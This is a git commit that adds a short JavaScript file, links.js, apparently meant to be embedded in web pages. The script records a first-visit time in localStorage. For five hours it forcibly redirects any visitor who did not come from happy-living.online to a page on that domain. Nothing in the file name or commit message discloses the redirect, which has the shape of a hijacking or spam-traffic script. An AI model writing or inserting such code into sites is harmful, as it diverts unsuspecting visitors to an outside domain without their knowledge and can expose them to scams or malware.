01412d47c6034963683ee53b32bae57fdb99b72d
boubaker1key <125211353+boubaker1key@users.noreply.github.com>
2024-03-13 14:22:20 +0100

    Create links.js

---
+++ links.js
@@ -0,0 +1,5 @@
+var thistime= new Date();
+if(!localStorage.getItem('time')){ localStorage.setItem('time',thistime); }
+var time = thistime - new Date(localStorage.getItem('time'));
+if(document.referrer!=="https://happy-living.online/"&&time < 18000000){
+    location.href="https://happy-living.online/zertx";}
